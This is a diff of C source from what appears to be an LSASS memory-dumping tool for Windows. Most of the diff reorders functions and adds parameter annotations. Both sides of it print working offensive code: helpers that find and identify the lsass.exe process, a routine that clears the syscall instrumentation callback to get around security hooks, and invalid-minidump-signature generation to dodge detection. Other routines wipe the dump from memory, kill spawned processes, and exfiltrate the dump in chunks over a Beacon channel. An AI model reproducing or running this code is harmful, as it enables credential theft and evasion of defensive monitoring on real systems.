@@ -3,8 +3,7 @@
 #include "syscalls.h"
 
 BOOL is_full_path(
-    LPCSTR filename
-)
+    IN LPCSTR filename)
 {
     char c;
 
@@ -27,9 +26,8 @@ BOOL is_full_path(
 }
 
 VOID get_full_path(
-    PUNICODE_STRING full_dump_path,
-    LPCSTR filename
-)
+    OUT PUNICODE_STRING full_dump_path,
+    IN LPCSTR filename)
 {
     wchar_t wcFileName[MAX_PATH];
 
@@ -59,10 +57,9 @@ LPCWSTR get_cwd(VOID)
 }
 
 BOOL write_file(
-    PUNICODE_STRING full_dump_path,
-    PBYTE fileData,
-    ULONG32 fileLength
-)
+    IN PUNICODE_STRING full_dump_path,
+    IN PBYTE fileData,
+    IN ULONG32 fileLength)
 {
     HANDLE hFile = NULL;
     OBJECT_ATTRIBUTES objAttr;
@@ -76,8 +73,7 @@ BOOL write_file(
         full_dump_path,
         OBJ_CASE_INSENSITIVE,
         NULL,
-        NULL
-    );
+        NULL);
     // create the file
     NTSTATUS status = NtCreateFile(
         &hFile,
@@ -90,8 +86,7 @@ BOOL write_file(
         FILE_OVERWRITE_IF,
         FILE_SYNCHRONOUS_IO_NONALERT,
         NULL,
-        0
-    );
+        0);
     if (status == STATUS_OBJECT_PATH_NOT_FOUND ||
         status == STATUS_OBJECT_NAME_INVALID)
     {
@@ -117,8 +112,7 @@ BOOL write_file(
         fileData,
         fileLength,
         NULL,
-        NULL
-    );
+        NULL);
     NtClose(hFile); hFile = NULL;
     if (!NT_SUCCESS(status))
     {
@@ -131,8 +125,7 @@ BOOL write_file(
 }
 
 BOOL create_file(
-    PUNICODE_STRING full_dump_path
-)
+    IN PUNICODE_STRING full_dump_path)
 {
     HANDLE hFile = NULL;
     OBJECT_ATTRIBUTES objAttr;
@@ -144,10 +137,8 @@ BOOL create_file(
         full_dump_path,
         OBJ_CASE_INSENSITIVE,
         NULL,
-        NULL
-    );
-    // call NtCreateFile with FILE_OPEN_IF
-    // FILE_OPEN_IF: If the file already exists, open it. If it does not, create the given file.
+        NULL);
+
     NTSTATUS status = NtCreateFile(
         &hFile,
         FILE_GENERIC_READ,
@@ -159,8 +150,7 @@ BOOL create_file(
         FILE_OPEN_IF,
         FILE_SYNCHRONOUS_IO_NONALERT,
         NULL,
-        0
-    );
+        0);
     if (status == STATUS_OBJECT_PATH_NOT_FOUND ||
         status == STATUS_OBJECT_NAME_INVALID ||
         status == STATUS_OBJECT_PATH_SYNTAX_BAD)
@@ -182,13 +172,237 @@ BOOL create_file(
     return TRUE;
 }
 
+BOOL delete_file(
+    IN LPCSTR filepath)
+{
+    OBJECT_ATTRIBUTES objAttr;
+    wchar_t wcFilePath[MAX_PATH];
+    UNICODE_STRING UnicodeFilePath;
+    UnicodeFilePath.Buffer = wcFilePath;
+    get_full_path(&UnicodeFilePath, filepath);
+
+    // init the object attributes
+    InitializeObjectAttributes(
+        &objAttr,
+        &UnicodeFilePath,
+        OBJ_CASE_INSENSITIVE,
+        NULL,
+        NULL);
+
+    NTSTATUS status = NtDeleteFile(&objAttr);
+    if (!NT_SUCCESS(status))
+    {
+        syscall_failed("NtDeleteFile", status);
+        DPRINT_ERR("Could not delete file: %s", filepath);
+        return FALSE;
+    }
+    DPRINT("Deleted file: %s", filepath);
+    return TRUE;
+}
+
+BOOL file_exists(
+    IN LPCSTR filepath)
+{
+    HANDLE hFile = NULL;
+    OBJECT_ATTRIBUTES objAttr;
+    IO_STATUS_BLOCK IoStatusBlock;
+    LARGE_INTEGER largeInteger;
+    largeInteger.QuadPart = 0;
+    wchar_t wcFilePath[MAX_PATH];
+    UNICODE_STRING UnicodeFilePath;
+    UnicodeFilePath.Buffer = wcFilePath;
+    get_full_path(&UnicodeFilePath, filepath);
+
+    // init the object attributes
+    InitializeObjectAttributes(
+        &objAttr,
+        &UnicodeFilePath,
+        OBJ_CASE_INSENSITIVE,
+        NULL,
+        NULL);
+    // call NtCreateFile with FILE_OPEN
+    NTSTATUS status = NtCreateFile(
+        &hFile,
+        FILE_GENERIC_READ,
+        &objAttr,
+        &IoStatusBlock,
+        &largeInteger,
+        FILE_ATTRIBUTE_NORMAL,
+        0,
+        FILE_OPEN,
+        FILE_SYNCHRONOUS_IO_NONALERT,
+        NULL,
+        0);
+    if (status == STATUS_SHARING_VIOLATION)
+    {
+        DPRINT_ERR("The file is being used by another process");
+        return FALSE;
+    }
+    if (status == STATUS_OBJECT_NAME_NOT_FOUND)
+        return FALSE;
+    if (!NT_SUCCESS(status))
+    {
+        syscall_failed("NtCreateFile", status);
+        DPRINT_ERR("Could check if the file %s exists", filepath);
+        return FALSE;
+    }
+    NtClose(hFile); hFile = NULL;
+    return TRUE;
+}
+
+BOOL remove_syscall_callback_hook(VOID)
+{
+    // you can remove this function by providing the compiler flag: -DNOSYSHOOK
+#ifndef NOSYSHOOK
+    PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION process_information;
+#ifdef _WIN64
+    process_information.Version = 0;
+#else
+    process_information.Version = 1;
+#endif
+    process_information.Reserved = 0;
+    process_information.Callback = NULL; // remove the callback function, if any
+
+    NTSTATUS status = NtSetInformationProcess_(
+        NtCurrentProcess(),
+        ProcessInstrumentationCallback,
+        &process_information,
+        sizeof(PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION));
+    if (!NT_SUCCESS(status))
+    {
+        syscall_failed("NtSetInformationProcess", status);
+        DPRINT_ERR("Failed to remove the syscall callback hook");
+        return FALSE;
+    }
+    else
+    {
+        DPRINT("The syscall callback hook was set to NULL");
+    }
+#endif
+    return TRUE;
+}
+
+VOID free_linked_list(
+    IN PVOID head)
+{
+    if (!head)
+        return;
+
+    Plinked_list node = (Plinked_list)head;
+    ULONG32 number_of_nodes = 0;
+    while (node)
+    {
+        number_of_nodes++;
+        node = node->next;
+    }
+
+    for (int i = number_of_nodes - 1; i >= 0; i--)
+    {
+        Plinked_list node = (Plinked_list)head;
+
+        int jumps = i;
+        while (jumps--)
+            node = node->next;
+
+        intFree(node); node = NULL;
+    }
+}
+
+PVOID allocate_memory(
+    OUT PSIZE_T region_size)
+{
+    PVOID base_address = NULL;
+    NTSTATUS status = NtAllocateVirtualMemory(
+        NtCurrentProcess(),
+        &base_address,
+        0,
+        region_size,
+        MEM_COMMIT,
+        PAGE_READWRITE);
+    if (!NT_SUCCESS(status))
+    {
+
+        DPRINT_ERR(
+            "Could not allocate enough memory to write the dump"
+        )
+        return NULL;
+    }
+    DPRINT(
+        "Allocated 0x%llx bytes at 0x%p to write the dump",
+        (ULONG64)*region_size,
+        base_address);
+    return base_address;
+}
+
+VOID encrypt_dump(
+    IN PVOID base_address,
+    IN SIZE_T region_size)
+{
+    // add your code here
+    return;
+}
+
+VOID erase_dump_from_memory(
+    IN PVOID base_address,
+    IN SIZE_T region_size)
+{
+    // delete all trace of the dump from memory
+    memset(base_address, 0, region_size);
+    // free the memory area where the dump was
+    region_size = 0;
+    NTSTATUS status = NtFreeVirtualMemory(
+        NtCurrentProcess(),
+        &base_address,
+        &region_size,
+        MEM_RELEASE);
+    if (!NT_SUCCESS(status))
+    {
+        syscall_failed("NtFreeVirtualMemory", status);
+        DPRINT_ERR("Could not erased the dump from memory");
+    }
+    else
+    {
+        DPRINT("Erased the dump from memory");
+    }
+}
+
+VOID generate_invalid_sig(
+    OUT PULONG32 Signature,
+    OUT PUSHORT Version,
+    OUT PUSHORT ImplementationVersion)
+{
+    time_t t;
+    srand((unsigned) time(&t));
+
+    *Signature             = MINIDUMP_SIGNATURE;
+    *Version               = MINIDUMP_VERSION;
+    *ImplementationVersion = MINIDUMP_IMPL_VERSION;
+
+    while (*Signature             == MINIDUMP_SIGNATURE ||
+           *Version               == MINIDUMP_VERSION ||
+           *ImplementationVersion == MINIDUMP_IMPL_VERSION)
+    {
+        *Signature  = 0;
+        *Signature |= (rand() & 0x7FFF) << 0x11;
+        *Signature |= (rand() & 0x7FFF) << 0x02;
+        *Signature |= (rand() & 0x0003) << 0x00;
+
+        *Version  = 0;
+        *Version |= (rand() & 0xFF) << 0x08;
+        *Version |= (rand() & 0xFF) << 0x00;
+
+        *ImplementationVersion  = 0;
+        *ImplementationVersion |= (rand() & 0xFF) << 0x08;
+        *ImplementationVersion |= (rand() & 0xFF) << 0x00;
+    }
+}
+
 #if defined(NANO) && defined(BOF)
 
 BOOL download_file(
-    LPCSTR fileName,
-    char fileData[],
-    ULONG32 fileLength
-)
+    IN LPCSTR fileName,
+    IN char fileData[],
+    IN ULONG32 fileLength)
 {
     int fileNameLength = strnlen(fileName, 256);
 
@@ -234,8 +448,7 @@ BOOL download_file(
     BeaconOutput(
         CALLBACK_FILE,
         packedData,
-        messageLength
-    );
+        messageLength);
     intFree(packedData); packedData = NULL;
 
     // we use the same memory region for all chucks
@@ -267,8 +480,7 @@ BOOL download_file(
         BeaconOutput(
             CALLBACK_FILE_WRITE,
             packedChunk,
-            4 + chunkLength
-        );
+            4 + chunkLength);
         exfiltrated += chunkLength;
     }
     intFree(packedChunk); packedChunk = NULL;
@@ -282,108 +494,22 @@ BOOL download_file(
     BeaconOutput(
         CALLBACK_FILE_CLOSE,
         packedClose,
-        4
-    );
+        4);
     DPRINT("The dump was downloaded filessly");
     return TRUE;
 }
 
 #endif
 
-BOOL delete_file(
-    LPCSTR filepath
-)
-{
-    OBJECT_ATTRIBUTES objAttr;
-    wchar_t wcFilePath[MAX_PATH];
-    UNICODE_STRING UnicodeFilePath;
-    UnicodeFilePath.Buffer = wcFilePath;
-    get_full_path(&UnicodeFilePath, filepath);
-
-    // init the object attributes
-    InitializeObjectAttributes(
-        &objAttr,
-        &UnicodeFilePath,
-        OBJ_CASE_INSENSITIVE,
-        NULL,
-        NULL
-    );
-
-    NTSTATUS status = NtDeleteFile(&objAttr);
-    if (!NT_SUCCESS(status))
-    {
-        syscall_failed("NtDeleteFile", status);
-        DPRINT_ERR("Could not delete file: %s", filepath);
-        return FALSE;
-    }
-    DPRINT("Deleted file: %s", filepath);
-    return TRUE;
-}
-
-BOOL file_exists(
-    LPCSTR filepath
-)
-{
-    HANDLE hFile = NULL;
-    OBJECT_ATTRIBUTES objAttr;
-    IO_STATUS_BLOCK IoStatusBlock;
-    LARGE_INTEGER largeInteger;
-    largeInteger.QuadPart = 0;
-    wchar_t wcFilePath[MAX_PATH];
-    UNICODE_STRING UnicodeFilePath;
-    UnicodeFilePath.Buffer = wcFilePath;
-    get_full_path(&UnicodeFilePath, filepath);
-
-    // init the object attributes
-    InitializeObjectAttributes(
-        &objAttr,
-        &UnicodeFilePath,
-        OBJ_CASE_INSENSITIVE,
-        NULL,
-        NULL
-    );
-    // call NtCreateFile with FILE_OPEN
-    NTSTATUS status = NtCreateFile(
-        &hFile,
-        FILE_GENERIC_READ,
-        &objAttr,
-        &IoStatusBlock,
-        &largeInteger,
-        FILE_ATTRIBUTE_NORMAL,
-        0,
-        FILE_OPEN,
-        FILE_SYNCHRONOUS_IO_NONALERT,
-        NULL,
-        0
-    );
-    if (status == STATUS_SHARING_VIOLATION)
-    {
-        DPRINT_ERR("The file is being used by another process");
-        return FALSE;
-    }
-    if (status == STATUS_OBJECT_NAME_NOT_FOUND)
-        return FALSE;
-    if (!NT_SUCCESS(status))
-    {
-        syscall_failed("NtCreateFile", status);
-        DPRINT_ERR("Could check if the file %s exists", filepath);
-        return FALSE;
-    }
-    NtClose(hFile); hFile = NULL;
-    return TRUE;
-}
-
-#if defined(NANO) && !defined(SSP)
+#if (defined(NANO) || defined(PPL)) && !defined(SSP)
 
 BOOL wait_for_process(
-    HANDLE hProcess
-)
+    IN HANDLE hProcess)
 {
     NTSTATUS status = NtWaitForSingleObject(
         hProcess,
         TRUE,
-        NULL
-    );
+        NULL);
     if (!NT_SUCCESS(status))
     {
         syscall_failed("NtWaitForSingleObject", status);
@@ -393,200 +519,10 @@ BOOL wait_for_process(
     return TRUE;
 }
 
-PVOID get_process_image(
-    HANDLE hProcess
-)
-{
-    NTSTATUS status;
-    ULONG BufferLength = 0x200;
-    PVOID buffer;
-    do
-    {
-        buffer = intAlloc(BufferLength);
-        if (!buffer)
-        {
-            malloc_failed();
-            DPRINT_ERR("Could not get the image of process");
-            return NULL;
-        }
-        status = NtQueryInformationProcess(
-            hProcess,
-            ProcessImageFileName,
-            buffer,
-            BufferLength,
-            &BufferLength
-        );
-        if (NT_SUCCESS(status))
-            return buffer;
-
-        intFree(buffer); buffer = NULL;
-    } while (status == STATUS_INFO_LENGTH_MISMATCH);
-
-    syscall_failed("NtQueryInformationProcess", status);
-    DPRINT_ERR("Could not get the image of process");
-    return NULL;
-}
-
-BOOL is_lsass(
-    HANDLE hProcess
-)
-{
-    PUNICODE_STRING image = get_process_image(hProcess);
-    if (!image)
-        return FALSE;
-
-    if (image->Length == 0)
-    {
-        intFree(image); image = NULL;
-        return FALSE;
-    }
-
-    if (wcsstr(image->Buffer, L"\\Windows\\System32\\lsass.exe"))
-    {
-        intFree(image); image = NULL;
-        return TRUE;
-    }
-
-    intFree(image); image = NULL;
-    return FALSE;
-}
-
-DWORD get_pid(
-    HANDLE hProcess
-)
-{
-    PROCESS_BASIC_INFORMATION basic_info;
-    basic_info.UniqueProcessId = 0;
-    PROCESSINFOCLASS ProcessInformationClass = 0;
-    NTSTATUS status = NtQueryInformationProcess(
-        hProcess,
-        ProcessInformationClass,
-        &basic_info,
-        sizeof(PROCESS_BASIC_INFORMATION),
-        NULL
-    );
-    if (!NT_SUCCESS(status))
-    {
-        syscall_failed("NtQueryInformationProcess", status);
-        return 0;
-    }
-
-    return basic_info.UniqueProcessId;
-}
-
-/*
- * kill a process by PID
- * used to kill processes created by MalSecLogon
- */
-BOOL kill_process(
-    DWORD pid,
-    HANDLE hProcess
-)
-{
-    if (!pid && !hProcess)
-        return TRUE;
-
-    if (pid)
-    {
-        // open a handle with PROCESS_TERMINATE
-        hProcess = get_process_handle(
-            pid,
-            PROCESS_TERMINATE,
-            FALSE
-        );
-        if (!hProcess)
-        {
-            DPRINT_ERR("Failed to kill process with PID: %ld", pid);
-            return FALSE;
-        }
-    }
-
-    NTSTATUS status = NtTerminateProcess(
-        hProcess,
-        ERROR_SUCCESS
-    );
-    if (!NT_SUCCESS(status))
-    {
-        syscall_failed("NtTerminateProcess", status);
-        if (pid)
-        {
-            DPRINT_ERR("Failed to kill process with PID: %ld", pid);
-        }
-        else
-        {
-            DPRINT_ERR("Failed to kill process with handle: 0x%lx", (DWORD)(ULONG_PTR)hProcess);
-        }
-        return FALSE;
-    }
-    if (pid)
-    {
-        DPRINT("Killed process with PID: %ld", pid);
-    }
-    else
-    {
-        DPRINT("Killed process with handle: 0x%lx", (DWORD)(ULONG_PTR)hProcess);
-    }
-
-    return TRUE;
-}
-
-DWORD get_lsass_pid(void)
-{
-    DWORD lsass_pid;
-    HANDLE hProcess = find_lsass(PROCESS_QUERY_INFORMATION);
-    if (!hProcess)
-        return 0;
-    lsass_pid = get_pid(hProcess);
-    NtClose(hProcess); hProcess = NULL;
-    if (!lsass_pid)
-    {
-        DPRINT_ERR("Could not get the PID of " LSASS);
-    }
-    else
-    {
-        DPRINT("Found the PID of " LSASS ": %ld", lsass_pid);
-    }
-    return lsass_pid;
-}
-
-BOOL remove_syscall_callback_hook()
-{
-    // you can remove this function by providing the compiler flag: -DNOSYSHOOK
-#ifndef NOSYSHOOK
-    PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION process_information;
-#ifdef _WIN64
-    process_information.Version = 0;
-#else
-    process_information.Version = 1;
-#endif
-    process_information.Reserved = 0;
-    process_information.Callback = NULL; // remove the callback function, if any
-
-    NTSTATUS status = NtSetInformationProcess_(
-        NtCurrentProcess(),
-        ProcessInstrumentationCallback,
-        &process_information,
-        sizeof(PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION)
-    );
-    if (!NT_SUCCESS(status))
-    {
-        syscall_failed("NtSetInformationProcess", status);
-        DPRINT_ERR("Failed to remove the syscall callback hook");
-        return FALSE;
-    }
-    else
-    {
-        DPRINT("The syscall callback hook was set to NULL");
-    }
-#endif
-    return TRUE;
-}
-
-void print_success(
-    LPCSTR dump_path,
-    BOOL use_valid_sig,
-    BOOL write_dump_to_disk
-)
+VOID print_success(
+    IN LPCSTR dump_path,
+    IN BOOL use_valid_sig,
+    IN BOOL write_dump_to_disk)
 {
     if (!use_valid_sig)
     {
@@ -621,125 +557,154 @@ void print_success(
 
 #endif
 
-void free_linked_list(
-    PVOID head
-)
+#if defined(NANO) && !defined(SSP)
+
+PVOID get_process_image(
+    IN HANDLE hProcess)
 {
-    if (!head)
-        return;
-
-    Plinked_list node = (Plinked_list)head;
-    ULONG32 number_of_nodes = 0;
-    while (node)
+    NTSTATUS status;
+    ULONG BufferLength = 0x200;
+    PVOID buffer;
+    do
     {
-        number_of_nodes++;
-        node = node->next;
-    }
+        buffer = intAlloc(BufferLength);
+        if (!buffer)
+        {
+            malloc_failed();
+            DPRINT_ERR("Could not get the image of process");
+            return NULL;
+        }
+        status = NtQueryInformationProcess(
+            hProcess,
+            ProcessImageFileName,
+            buffer,
+            BufferLength,
+            &BufferLength);
+        if (NT_SUCCESS(status))
+            return buffer;
 
-    for (int i = number_of_nodes - 1; i >= 0; i--)
-    {
-        Plinked_list node = (Plinked_list)head;
+        intFree(buffer); buffer = NULL;
+    } while (status == STATUS_INFO_LENGTH_MISMATCH);
 
-        int jumps = i;
-        while (jumps--)
-            node = node->next;
-
-        intFree(node); node = NULL;
-    }
+    syscall_failed("NtQueryInformationProcess", status);
+    DPRINT_ERR("Could not get the image of process");
+    return NULL;
 }
 
-PVOID allocate_memory(
-    PSIZE_T region_size
-)
+BOOL is_lsass(
+    IN HANDLE hProcess)
 {
-    PVOID base_address = NULL;
-    NTSTATUS status = NtAllocateVirtualMemory(
-        NtCurrentProcess(),
-        &base_address,
-        0,
-        region_size,
-        MEM_COMMIT,
-        PAGE_READWRITE
-    );
+    PUNICODE_STRING image = get_process_image(hProcess);
+    if (!image)
+        return FALSE;
+
+    if (image->Length == 0)
+    {
+        intFree(image); image = NULL;
+        return FALSE;
+    }
+
+    if (wcsstr(image->Buffer, L"\\Windows\\System32\\lsass.exe"))
+    {
+        intFree(image); image = NULL;
+        return TRUE;
+    }
+
+    intFree(image); image = NULL;
+    return FALSE;
+}
+
+DWORD get_pid(
+    IN HANDLE hProcess)
+{
+    PROCESS_BASIC_INFORMATION basic_info;
+    basic_info.UniqueProcessId = 0;
+    PROCESSINFOCLASS ProcessInformationClass = 0;
+    NTSTATUS status = NtQueryInformationProcess(
+        hProcess,
+        ProcessInformationClass,
+        &basic_info,
+        sizeof(PROCESS_BASIC_INFORMATION),
+        NULL);
     if (!NT_SUCCESS(status))
     {
-
-        DPRINT_ERR(
-            "Could not allocate enough memory to write the dump"
-        )
-        return NULL;
+        syscall_failed("NtQueryInformationProcess", status);
+        return 0;
     }
-    DPRINT(
-        "Allocated 0x%llx bytes at 0x%p to write the dump",
-        (ULONG64)*region_size,
-        base_address
-    );
-    return base_address;
+
+    return basic_info.UniqueProcessId;
 }
 
-void encrypt_dump(
-    PVOID base_address,
-    SIZE_T region_size
-)
+/*
+ * kill a process by PID
+ * used to kill processes created by MalSecLogon
+ */
+BOOL kill_process(
+    IN DWORD pid,
+    IN HANDLE hProcess)
 {
-    // add your code here
-    return;
-}
+    if (!pid && !hProcess)
+        return TRUE;
 
-void erase_dump_from_memory(
-    PVOID base_address,
-    SIZE_T region_size
-)
-{
-    // delete all trace of the dump from memory
-    memset(base_address, 0, region_size);
-    // free the memory area where the dump was
-    region_size = 0;
-    NTSTATUS status = NtFreeVirtualMemory(
-        NtCurrentProcess(),
-        &base_address,
-        &region_size,
-        MEM_RELEASE
-    );
+    if (pid)
+    {
+        // open a handle with PROCESS_TERMINATE
+        hProcess = get_process_handle(
+            pid,
+            PROCESS_TERMINATE,
+            FALSE);
+        if (!hProcess)
+        {
+            DPRINT_ERR("Failed to kill process with PID: %ld", pid);
+            return FALSE;
+        }
+    }
+
+    NTSTATUS status = NtTerminateProcess(
+        hProcess,
+        ERROR_SUCCESS);
     if (!NT_SUCCESS(status))
     {
-        syscall_failed("NtFreeVirtualMemory", status);
-        DPRINT_ERR("Could not erased the dump from memory");
+        syscall_failed("NtTerminateProcess", status);
+        if (pid)
+        {
+            DPRINT_ERR("Failed to kill process with PID: %ld", pid);
+        }
+        else
+        {
+            DPRINT_ERR("Failed to kill process with handle: 0x%lx", (DWORD)(ULONG_PTR)hProcess);
+        }
+        return FALSE;
+    }
+    if (pid)
+    {
+        DPRINT("Killed process with PID: %ld", pid);
     }
     else
     {
-        DPRINT("Erased the dump from memory");
+        DPRINT("Killed process with handle: 0x%lx", (DWORD)(ULONG_PTR)hProcess);
     }
+
+    return TRUE;
 }
 
-void generate_invalid_sig(
-    PULONG32 Signature,
-    PUSHORT Version,
-    PUSHORT ImplementationVersion
-)
+DWORD get_lsass_pid(VOID)
 {
-    time_t t;
-    srand((unsigned) time(&t));
-
-    *Signature             = MINIDUMP_SIGNATURE;
-    *Version               = MINIDUMP_VERSION;
-    *ImplementationVersion = MINIDUMP_IMPL_VERSION;
-
-    while (*Signature             == MINIDUMP_SIGNATURE ||
-           *Version               == MINIDUMP_VERSION ||
-           *ImplementationVersion == MINIDUMP_IMPL_VERSION)
+    DWORD lsass_pid;
+    HANDLE hProcess = find_lsass(PROCESS_QUERY_INFORMATION);
+    if (!hProcess)
+        return 0;
+    lsass_pid = get_pid(hProcess);
+    NtClose(hProcess); hProcess = NULL;
+    if (!lsass_pid)
     {
-        *Signature  = 0;
-        *Signature |= (rand() & 0x7FFF) << 0x11;
-        *Signature |= (rand() & 0x7FFF) << 0x02;
-        *Signature |= (rand() & 0x0003) << 0x00;
-
-        *Version  = 0;
-        *Version |= (rand() & 0xFF) << 0x08;
-        *Version |= (rand() & 0xFF) << 0x00;
-
-        *ImplementationVersion  = 0;
-        *ImplementationVersion |= (rand() & 0xFF) << 0x08;
-        *ImplementationVersion |= (rand() & 0xFF) << 0x00;
+        DPRINT_ERR("Could not get the PID of " LSASS);
     }
+    else
+    {
+        DPRINT("Found the PID of " LSASS ": %ld", lsass_pid);
+    }
+    return lsass_pid;
 }
+
+#endif
